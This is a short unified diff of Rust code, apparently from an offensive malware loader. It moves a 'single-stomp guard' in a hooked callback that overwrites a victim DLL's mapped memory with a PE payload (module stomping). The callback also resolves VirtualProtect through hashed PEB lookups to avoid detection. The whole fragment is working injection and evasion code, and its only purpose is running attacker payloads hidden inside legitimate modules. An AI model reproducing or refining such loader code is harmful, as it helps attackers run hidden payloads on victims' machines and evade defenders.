@@ -406,11 +406,6 @@ unsafe extern "system" fn mm_acquired_vas(
         if payload_size < 0x40 {
             return S_OK;
         }
-        // Single-stomp guard: clear pending AFTER all precondition checks pass,
-        // just before the PE copy. This prevents a second AcquiredVAS call
-        // (from a dependency DLL mapped after the victim during Load_2) from
-        // also attempting to stomp.
-        core::ptr::write_volatile(&mut (*sp).pending, 0);
         let e_lfanew = u32::from_le_bytes([
             *payload_bytes.add(0x3C),
             *payload_bytes.add(0x3D),
@@ -443,6 +438,13 @@ unsafe extern "system" fn mm_acquired_vas(
         if section_table_off + n_sections * 40 > payload_size {
             return S_OK;
         }
+
+        // Single-stomp guard: clear pending AFTER all structural precondition
+        // checks on both victim mapping and payload pass. Prevents a second
+        // AcquiredVAS call (dependency DLL mapped after victim during Load_2)
+        // from consuming the stomp opportunity, and ensures payload-structure
+        // failures do not silently discard the one chance to stomp.
+        core::ptr::write_volatile(&mut (*sp).pending, 0);
 
         type VPFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
         let vp: VPFn = match peb_fn(hash!("kernel32.dll"), hash!("VirtualProtect")) {
